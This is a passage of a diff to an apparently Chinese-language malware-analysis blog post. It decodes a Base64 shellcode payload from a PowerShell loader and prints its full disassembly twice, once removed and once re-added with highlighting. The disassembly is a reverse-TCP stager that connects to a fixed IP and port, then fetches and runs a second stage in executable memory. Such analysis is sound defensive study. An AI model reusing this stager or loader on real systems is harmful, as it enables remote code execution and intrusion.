+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">Marshal</span><span class="op">]::</span>GetDelegateForFunctionPointer<span class="op">((</span>j6ih kernel32<span class="op">.</span><span class="fu">dll</span> WaitForSingleObject<span class="op">),</span> <span class="op">(</span>fO6N @<span class="op">([</span>IntPtr<span class="op">],</span> <span class="op">[</span>Int32<span class="op">]))).</span><span class="fu">Invoke</span><span class="op">(</span><span class="va">$blUE9</span><span class="op">,</span> 0xffffffff<span class="op">)</span> <span class="op">|</span> Out <span class="op">-</span> Null</span></code></pre></div>
+<h2 id="shellcode">3. ShellCode</h2>
+<p>从<code>kernel32.dll</code>和<code>VirtualAlloc</code>容易判断出，变量<code>$dvxe9</code>是Base64后的Shellcode。</p>
+<p>用python
+Base64解一下，变成<code>\x00\xff\x12\x33</code>这样的十六进制格式，方便后续解码。</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="im">from</span> base64 <span class="im">import</span> b64decode <span class="im">as</span> d</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> code <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="st">&quot;&quot;</span>.join(<span class="bu">list</span>(<span class="bu">map</span>(<span class="kw">lambda</span> y:<span class="st">&quot;</span><span class="ch">\\</span><span class="st">x</span><span class="sc">%x</span><span class="st">&quot;</span><span class="op">%</span>y,d(code)))))</span></code></pre></div>
 <p>存文件丢IDA或者直接放在线网站解shellcode</p>
-<p> <a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a> </p>
+<p>http://shell-storm.org/online/Online-Assembler-and-Disassembler/</p>
 <p>得到汇编</p>
-<pre><code class="lang-asm">0x0000000000000000:  FC                   cld    
-0x0000000000000001:  E8 82 00 00 00       call   0x88
-0x0000000000000006:  60                   pushal 
-0x0000000000000007:  89 E5                mov    ebp, esp
-0x0000000000000009:  31 C0                xor    eax, eax
-0x000000000000000b:  64 8B 50 30          mov    edx, dword ptr fs:[eax + 0x30]
-0x000000000000000f:  8B 52 0C             mov    edx, dword ptr [edx + 0xc]
-0x0000000000000012:  8B 52 14             mov    edx, dword ptr [edx + 0x14]
-0x0000000000000015:  8B 72 28             mov    esi, dword ptr [edx + 0x28]
-0x0000000000000018:  0F B7 4A 26          movzx  ecx, word ptr [edx + 0x26]
-0x000000000000001c:  31 FF                xor    edi, edi
-0x000000000000001e:  AC                   lodsb  al, byte ptr [esi]
-0x000000000000001f:  3C 61                cmp    al, 0x61
-0x0000000000000021:  7C 02                jl     0x25
-0x0000000000000023:  2C 20                sub    al, 0x20
-0x0000000000000025:  C1 CF 0D             ror    edi, 0xd
-0x0000000000000028:  01 C7                add    edi, eax
-0x000000000000002a:  E2 F2                loop   0x1e
-0x000000000000002c:  52                   push   edx
-0x000000000000002d:  57                   push   edi
-0x000000000000002e:  8B 52 10             mov    edx, dword ptr [edx + 0x10]
-0x0000000000000031:  8B 4A 3C             mov    ecx, dword ptr [edx + 0x3c]
-0x0000000000000034:  8B 4C 11 78          mov    ecx, dword ptr [ecx + edx + 0x78]
-0x0000000000000038:  E3 48                jecxz  0x82
-0x000000000000003a:  01 D1                add    ecx, edx
-0x000000000000003c:  51                   push   ecx
-0x000000000000003d:  8B 59 20             mov    ebx, dword ptr [ecx + 0x20]
-0x0000000000000040:  01 D3                add    ebx, edx
-0x0000000000000042:  8B 49 18             mov    ecx, dword ptr [ecx + 0x18]
-0x0000000000000045:  E3 3A                jecxz  0x81
-0x0000000000000047:  49                   dec    ecx
-0x0000000000000048:  8B 34 8B             mov    esi, dword ptr [ebx + ecx*4]
-0x000000000000004b:  01 D6                add    esi, edx
-0x000000000000004d:  31 FF                xor    edi, edi
-0x000000000000004f:  AC                   lodsb  al, byte ptr [esi]
-0x0000000000000050:  C1 CF 0D             ror    edi, 0xd
-0x0000000000000053:  01 C7                add    edi, eax
-0x0000000000000055:  38 E0                cmp    al, ah
-0x0000000000000057:  75 F6                jne    0x4f
-0x0000000000000059:  03 7D F8             add    edi, dword ptr [ebp - 8]
-0x000000000000005c:  3B 7D 24             cmp    edi, dword ptr [ebp + 0x24]
-0x000000000000005f:  75 E4                jne    0x45
-0x0000000000000061:  58                   pop    eax
-0x0000000000000062:  8B 58 24             mov    ebx, dword ptr [eax + 0x24]
-0x0000000000000065:  01 D3                add    ebx, edx
-0x0000000000000067:  66 8B 0C 4B          mov    cx, word ptr [ebx + ecx*2]
-0x000000000000006b:  8B 58 1C             mov    ebx, dword ptr [eax + 0x1c]
-0x000000000000006e:  01 D3                add    ebx, edx
-0x0000000000000070:  8B 04 8B             mov    eax, dword ptr [ebx + ecx*4]
-0x0000000000000073:  01 D0                add    eax, edx
-0x0000000000000075:  89 44 24 24          mov    dword ptr [esp + 0x24], eax
-0x0000000000000079:  5B                   pop    ebx
-0x000000000000007a:  5B                   pop    ebx
-0x000000000000007b:  61                   popal  
-0x000000000000007c:  59                   pop    ecx
-0x000000000000007d:  5A                   pop    edx
-0x000000000000007e:  51                   push   ecx
-0x000000000000007f:  FF E0                jmp    eax
-0x0000000000000081:  5F                   pop    edi
-0x0000000000000082:  5F                   pop    edi
-0x0000000000000083:  5A                   pop    edx
-0x0000000000000084:  8B 12                mov    edx, dword ptr [edx]
-0x0000000000000086:  EB 8D                jmp    0x15
-0x0000000000000088:  5D                   pop    ebp
-0x0000000000000089:  68 33 32 00 00       push   0x3233
-0x000000000000008e:  68 77 73 32 5F       push   0x5f327377
-0x0000000000000093:  54                   push   esp
-0x0000000000000094:  68 4C 77 26 07       push   0x726774c
-0x0000000000000099:  89 E8                mov    eax, ebp
-0x000000000000009b:  FF D0                call   eax
-0x000000000000009d:  B8 90 01 00 00       mov    eax, 0x190
-0x00000000000000a2:  29 C4                sub    esp, eax
-0x00000000000000a4:  54                   push   esp
-0x00000000000000a5:  50                   push   eax
-0x00000000000000a6:  68 29 80 6B 00       push   0x6b8029
-0x00000000000000ab:  FF D5                call   ebp
-0x00000000000000ad:  6A 0A                push   0xa
-0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0
-0x00000000000000b4:  68 02 00 1E 60       push   0x601e0002
-0x00000000000000b9:  89 E6                mov    esi, esp
-0x00000000000000bb:  50                   push   eax
-0x00000000000000bc:  50                   push   eax
-0x00000000000000bd:  50                   push   eax
-0x00000000000000be:  50                   push   eax
-0x00000000000000bf:  40                   inc    eax
-0x00000000000000c0:  50                   push   eax
-0x00000000000000c1:  40                   inc    eax
-0x00000000000000c2:  50                   push   eax
-0x00000000000000c3:  68 EA 0F DF E0       push   0xe0df0fea
-0x00000000000000c8:  FF D5                call   ebp
-0x00000000000000ca:  97                   xchg   eax, edi
-0x00000000000000cb:  6A 10                push   0x10
-0x00000000000000cd:  56                   push   esi
-0x00000000000000ce:  57                   push   edi
-0x00000000000000cf:  68 99 A5 74 61       push   0x6174a599
-0x00000000000000d4:  FF D5                call   ebp
-0x00000000000000d6:  85 C0                test   eax, eax
-0x00000000000000d8:  74 0A                je     0xe4
-0x00000000000000da:  FF 4E 08             dec    dword ptr [esi + 8]
-0x00000000000000dd:  75 EC                jne    0xcb
-0x00000000000000df:  E8 67 00 00 00       call   0x14b
-0x00000000000000e4:  6A 00                push   0
-0x00000000000000e6:  6A 04                push   4
-0x00000000000000e8:  56                   push   esi
-0x00000000000000e9:  57                   push   edi
-0x00000000000000ea:  68 02 D9 C8 5F       push   0x5fc8d902
-0x00000000000000ef:  FF D5                call   ebp
-0x00000000000000f1:  83 F8 00             cmp    eax, 0
-0x00000000000000f4:  7E 36                jle    0x12c
-0x00000000000000f6:  8B 36                mov    esi, dword ptr [esi]
-0x00000000000000f8:  6A 40                push   0x40
-0x00000000000000fa:  68 00 10 00 00       push   0x1000
-0x00000000000000ff:  56                   push   esi
-0x0000000000000100:  6A 00                push   0
-0x0000000000000102:  68 58 A4 53 E5       push   0xe553a458
-0x0000000000000107:  FF D5                call   ebp
-0x0000000000000109:  93                   xchg   eax, ebx
-0x000000000000010a:  53                   push   ebx
-0x000000000000010b:  6A 00                push   0
-0x000000000000010d:  56                   push   esi
-0x000000000000010e:  53                   push   ebx
-0x000000000000010f:  57                   push   edi
-0x0000000000000110:  68 02 D9 C8 5F       push   0x5fc8d902
-0x0000000000000115:  FF D5                call   ebp
-0x0000000000000117:  83 F8 00             cmp    eax, 0
-0x000000000000011a:  7D 28                jge    0x144
-0x000000000000011c:  58                   pop    eax
-0x000000000000011d:  68 00 40 00 00       push   0x4000
-0x0000000000000122:  6A 00                push   0
-0x0000000000000124:  50                   push   eax
-0x0000000000000125:  68 0B 2F 0F 30       push   0x300f2f0b
-0x000000000000012a:  FF D5                call   ebp
-0x000000000000012c:  57                   push   edi
-0x000000000000012d:  68 75 6E 4D 61       push   0x614d6e75
-0x0000000000000132:  FF D5                call   ebp
-0x0000000000000134:  5E                   pop    esi
-0x0000000000000135:  5E                   pop    esi
-0x0000000000000136:  FF 0C 24             dec    dword ptr [esp]
-0x0000000000000139:  0F 85 70 FF FF FF    jne    0xaf
-0x000000000000013f:  E9 9B FF FF FF       jmp    0xdf
-0x0000000000000144:  01 C3                add    ebx, eax
-0x0000000000000146:  29 C6                sub    esi, eax
-0x0000000000000148:  75 C1                jne    0x10b
-0x000000000000014a:  C3                   ret    
-0x000000000000014b:  BB E0 1D 2A 0A       mov    ebx, 0xa2a1de0
-0x0000000000000150:  68 A6 95 BD 9D       push   0x9dbd95a6
-0x0000000000000155:  FF D5                call   ebp
-0x0000000000000157:  3C 06                cmp    al, 6
-0x0000000000000159:  7C 0A                jl     0x165
-0x000000000000015b:  80 FB E0             cmp    bl, 0xe0
-0x000000000000015e:  75 05                jne    0x165
-0x0000000000000160:  BB 47 13 72 6F       mov    ebx, 0x6f721347
-0x0000000000000165:  6A 00                push   0
-0x0000000000000167:  53                   push   ebx
-0x0000000000000168:  FF D5                call   ebp
-</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>0x0000000000000000:  FC                   cld    </span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>0x0000000000000001:  E8 <span class="dv">82</span> <span class="dv">00</span> <span class="dv">00</span> <span class="dv">00</span>       call   <span class="bn">0x88</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>0x0000000000000006:  60                   pushal </span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>0x0000000000000007:  89 E5                mov    <span class="kw">ebp</span><span class="op">,</span> <span class="kw">esp</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>0x0000000000000009:  31 C0                <span class="op">xor</span>    <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>0x000000000000000b:  64 8B 50 30          <span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="kw">fs</span><span class="op">:[</span><span class="kw">eax</span> <span class="op">+</span> <span class="bn">0x30</span><span class="op">]</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>0x000000000000000f:  8B 52 0C             <span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span> <span class="op">+</span> <span class="bn">0xc</span><span class="op">]</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>0x0000000000000012:  8B 52 14             <span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span> <span class="op">+</span> <span class="bn">0x14</span><span class="op">]</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>0x0000000000000015:  8B 72 28             <span class="bu">mov</span>    <span class="kw">esi</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span> <span class="op">+</span> <span class="bn">0x28</span><span class="op">]</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>0x0000000000000018:  0F B7 <span class="dv">4</span><span class="er">A</span> <span class="dv">26</span>          movzx  <span class="kw">ecx</span><span class="op">,</span> <span class="dt">word</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span> <span class="op">+</span> <span class="bn">0x26</span><span class="op">]</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>0x000000000000001c:  31 FF                <span class="op">xor</span>    <span class="kw">edi</span><span class="op">,</span> <span class="kw">edi</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>0x000000000000001e:  AC                   lodsb  <span class="kw">al</span><span class="op">,</span> <span class="dt">byte</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esi</span><span class="op">]</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>0x000000000000001f:  3C 61                <span class="bu">cmp</span>    <span class="kw">al</span><span class="op">,</span> <span class="bn">0x61</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>0x0000000000000021:  7C 02                <span class="cf">jl</span>     <span class="bn">0x25</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>0x0000000000000023:  2C 20                <span class="bu">sub</span>    <span class="kw">al</span><span class="op">,</span> <span class="bn">0x20</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>0x0000000000000025:  C1 CF <span class="dv">0</span><span class="bn">D</span>             ror    <span class="kw">edi</span><span class="op">,</span> <span class="bn">0xd</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>0x0000000000000028:  01 C7                add    <span class="kw">edi</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>0x000000000000002a:  E2 F2                loop   <span class="bn">0x1e</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>0x000000000000002c:  52                   <span class="bu">push</span>   <span class="kw">edx</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>0x000000000000002d:  57                   <span class="bu">push</span>   <span class="kw">edi</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>0x000000000000002e:  8B 52 10             <span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span> <span class="op">+</span> <span class="bn">0x10</span><span class="op">]</span></span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>0x0000000000000031:  8B 4A 3C             <span class="bu">mov</span>    <span class="kw">ecx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span> <span class="op">+</span> <span class="bn">0x3c</span><span class="op">]</span></span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>0x0000000000000034:  8B 4C 11 78          <span class="bu">mov</span>    <span class="kw">ecx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ecx</span> <span class="op">+</span> <span class="kw">edx</span> <span class="op">+</span> <span class="bn">0x78</span><span class="op">]</span></span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>0x0000000000000038:  E3 <span class="dv">48</span>                jecxz  <span class="bn">0x82</span></span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a>0x000000000000003a:  01 D1                add    <span class="kw">ecx</span><span class="op">,</span> <span class="kw">edx</span></span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>0x000000000000003c:  51                   <span class="bu">push</span>   <span class="kw">ecx</span></span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a>0x000000000000003d:  8B 59 20             <span class="bu">mov</span>    <span class="kw">ebx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ecx</span> <span class="op">+</span> <span class="bn">0x20</span><span class="op">]</span></span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>0x0000000000000040:  01 D3                add    <span class="kw">ebx</span><span class="op">,</span> <span class="kw">edx</span></span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a>0x0000000000000042:  8B 49 18             <span class="bu">mov</span>    <span class="kw">ecx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ecx</span> <span class="op">+</span> <span class="bn">0x18</span><span class="op">]</span></span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>0x0000000000000045:  E3 <span class="dv">3</span><span class="er">A</span>                jecxz  <span class="bn">0x81</span></span>
+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a>0x0000000000000047:  49                   <span class="bu">dec</span>    <span class="kw">ecx</span></span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a>0x0000000000000048:  8B 34 8B             <span class="bu">mov</span>    <span class="kw">esi</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ebx</span> <span class="op">+</span> <span class="kw">ecx</span><span class="op">*</span><span class="dv">4</span><span class="op">]</span></span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>0x000000000000004b:  01 D6                add    <span class="kw">esi</span><span class="op">,</span> <span class="kw">edx</span></span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a>0x000000000000004d:  31 FF                <span class="op">xor</span>    <span class="kw">edi</span><span class="op">,</span> <span class="kw">edi</span></span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>0x000000000000004f:  AC                   lodsb  <span class="kw">al</span><span class="op">,</span> <span class="dt">byte</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esi</span><span class="op">]</span></span>
+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a>0x0000000000000050:  C1 CF <span class="dv">0</span><span class="bn">D</span>             ror    <span class="kw">edi</span><span class="op">,</span> <span class="bn">0xd</span></span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>0x0000000000000053:  01 C7                add    <span class="kw">edi</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>0x0000000000000055:  38 E0                cmp    <span class="kw">al</span><span class="op">,</span> <span class="kw">ah</span></span>
+<span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a>0x0000000000000057:  75 F6                jne    <span class="bn">0x4f</span></span>
+<span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a>0x0000000000000059:  03 7D F8             add    <span class="kw">edi</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ebp</span> <span class="op">-</span> <span class="dv">8</span><span class="op">]</span></span>
+<span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a>0x000000000000005c:  3B 7D 24             <span class="bu">cmp</span>    <span class="kw">edi</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ebp</span> <span class="op">+</span> <span class="bn">0x24</span><span class="op">]</span></span>
+<span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a>0x000000000000005f:  75 E4                jne    <span class="bn">0x45</span></span>
+<span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a>0x0000000000000061:  58                   <span class="bu">pop</span>    <span class="kw">eax</span></span>
+<span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a>0x0000000000000062:  8B 58 24             <span class="bu">mov</span>    <span class="kw">ebx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">eax</span> <span class="op">+</span> <span class="bn">0x24</span><span class="op">]</span></span>
+<span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a>0x0000000000000065:  01 D3                add    <span class="kw">ebx</span><span class="op">,</span> <span class="kw">edx</span></span>
+<span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a>0x0000000000000067:  66 8B 0C 4B          <span class="bu">mov</span>    <span class="kw">cx</span><span class="op">,</span> <span class="dt">word</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ebx</span> <span class="op">+</span> <span class="kw">ecx</span><span class="op">*</span><span class="dv">2</span><span class="op">]</span></span>
+<span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a>0x000000000000006b:  8B 58 1C             <span class="bu">mov</span>    <span class="kw">ebx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">eax</span> <span class="op">+</span> <span class="bn">0x1c</span><span class="op">]</span></span>
+<span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a>0x000000000000006e:  01 D3                add    <span class="kw">ebx</span><span class="op">,</span> <span class="kw">edx</span></span>
+<span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a>0x0000000000000070:  8B 04 8B             <span class="bu">mov</span>    <span class="kw">eax</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">ebx</span> <span class="op">+</span> <span class="kw">ecx</span><span class="op">*</span><span class="dv">4</span><span class="op">]</span></span>
+<span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a>0x0000000000000073:  01 D0                add    <span class="kw">eax</span><span class="op">,</span> <span class="kw">edx</span></span>
+<span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a>0x0000000000000075:  89 44 24 24          <span class="bu">mov</span>    <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esp</span> <span class="op">+</span> <span class="bn">0x24</span><span class="op">],</span> <span class="kw">eax</span></span>
+<span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a>0x0000000000000079:  5B                   <span class="bu">pop</span>    <span class="kw">ebx</span></span>
+<span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a>0x000000000000007a:  5B                   <span class="bu">pop</span>    <span class="kw">ebx</span></span>
+<span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a>0x000000000000007b:  61                   popal  </span>
+<span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a>0x000000000000007c:  59                   <span class="bu">pop</span>    <span class="kw">ecx</span></span>
+<span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a>0x000000000000007d:  5A                   <span class="bu">pop</span>    <span class="kw">edx</span></span>
+<span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a>0x000000000000007e:  51                   <span class="bu">push</span>   <span class="kw">ecx</span></span>
+<span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a>0x000000000000007f:  FF E0                jmp    <span class="kw">eax</span></span>
+<span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a>0x0000000000000081:  5F                   <span class="bu">pop</span>    <span class="kw">edi</span></span>
+<span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a>0x0000000000000082:  5F                   <span class="bu">pop</span>    <span class="kw">edi</span></span>
+<span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a>0x0000000000000083:  5A                   <span class="bu">pop</span>    <span class="kw">edx</span></span>
+<span id="cb6-62"><a href="#cb6-62" aria-hidden="true" tabindex="-1"></a>0x0000000000000084:  8B 12                <span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">edx</span><span class="op">]</span></span>
+<span id="cb6-63"><a href="#cb6-63" aria-hidden="true" tabindex="-1"></a>0x0000000000000086:  EB <span class="dv">8</span><span class="bn">D</span>                jmp    <span class="bn">0x15</span></span>
+<span id="cb6-64"><a href="#cb6-64" aria-hidden="true" tabindex="-1"></a>0x0000000000000088:  5D                   <span class="bu">pop</span>    <span class="kw">ebp</span></span>
+<span id="cb6-65"><a href="#cb6-65" aria-hidden="true" tabindex="-1"></a>0x0000000000000089:  68 33 32 00 00       <span class="bu">push</span>   <span class="bn">0x3233</span></span>
+<span id="cb6-66"><a href="#cb6-66" aria-hidden="true" tabindex="-1"></a>0x000000000000008e:  68 77 73 32 5F       <span class="bu">push</span>   <span class="bn">0x5f327377</span></span>
+<span id="cb6-67"><a href="#cb6-67" aria-hidden="true" tabindex="-1"></a>0x0000000000000093:  54                   <span class="bu">push</span>   <span class="kw">esp</span></span>
+<span id="cb6-68"><a href="#cb6-68" aria-hidden="true" tabindex="-1"></a>0x0000000000000094:  68 4C 77 26 07       <span class="bu">push</span>   <span class="bn">0x726774c</span></span>
+<span id="cb6-69"><a href="#cb6-69" aria-hidden="true" tabindex="-1"></a>0x0000000000000099:  89 E8                mov    <span class="kw">eax</span><span class="op">,</span> <span class="kw">ebp</span></span>
+<span id="cb6-70"><a href="#cb6-70" aria-hidden="true" tabindex="-1"></a>0x000000000000009b:  FF D0                call   <span class="kw">eax</span></span>
+<span id="cb6-71"><a href="#cb6-71" aria-hidden="true" tabindex="-1"></a>0x000000000000009d:  B8 <span class="dv">90</span> <span class="dv">01</span> <span class="dv">00</span> <span class="dv">00</span>       mov    <span class="kw">eax</span><span class="op">,</span> <span class="bn">0x190</span></span>
+<span id="cb6-72"><a href="#cb6-72" aria-hidden="true" tabindex="-1"></a>0x00000000000000a2:  29 C4                sub    <span class="kw">esp</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-73"><a href="#cb6-73" aria-hidden="true" tabindex="-1"></a>0x00000000000000a4:  54                   <span class="bu">push</span>   <span class="kw">esp</span></span>
+<span id="cb6-74"><a href="#cb6-74" aria-hidden="true" tabindex="-1"></a>0x00000000000000a5:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-75"><a href="#cb6-75" aria-hidden="true" tabindex="-1"></a>0x00000000000000a6:  68 29 80 6B 00       <span class="bu">push</span>   <span class="bn">0x6b8029</span></span>
+<span id="cb6-76"><a href="#cb6-76" aria-hidden="true" tabindex="-1"></a>0x00000000000000ab:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-77"><a href="#cb6-77" aria-hidden="true" tabindex="-1"></a>0x00000000000000ad:  6A 0A                <span class="bu">push</span>   <span class="bn">0xa</span></span>
+<span id="cb6-78"><a href="#cb6-78" aria-hidden="true" tabindex="-1"></a>0x00000000000000af:  68 C0 A8 <span class="dv">34</span> <span class="fl">8</span><span class="bn">F</span>       push   <span class="bn">0x8f34a8c0</span></span>
+<span id="cb6-79"><a href="#cb6-79" aria-hidden="true" tabindex="-1"></a>0x00000000000000b4:  68 02 00 1E 60       <span class="bu">push</span>   <span class="bn">0x601e0002</span></span>
+<span id="cb6-80"><a href="#cb6-80" aria-hidden="true" tabindex="-1"></a>0x00000000000000b9:  89 E6                mov    <span class="kw">esi</span><span class="op">,</span> <span class="kw">esp</span></span>
+<span id="cb6-81"><a href="#cb6-81" aria-hidden="true" tabindex="-1"></a>0x00000000000000bb:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-82"><a href="#cb6-82" aria-hidden="true" tabindex="-1"></a>0x00000000000000bc:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-83"><a href="#cb6-83" aria-hidden="true" tabindex="-1"></a>0x00000000000000bd:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-84"><a href="#cb6-84" aria-hidden="true" tabindex="-1"></a>0x00000000000000be:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-85"><a href="#cb6-85" aria-hidden="true" tabindex="-1"></a>0x00000000000000bf:  40                   <span class="bu">inc</span>    <span class="kw">eax</span></span>
+<span id="cb6-86"><a href="#cb6-86" aria-hidden="true" tabindex="-1"></a>0x00000000000000c0:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-87"><a href="#cb6-87" aria-hidden="true" tabindex="-1"></a>0x00000000000000c1:  40                   <span class="bu">inc</span>    <span class="kw">eax</span></span>
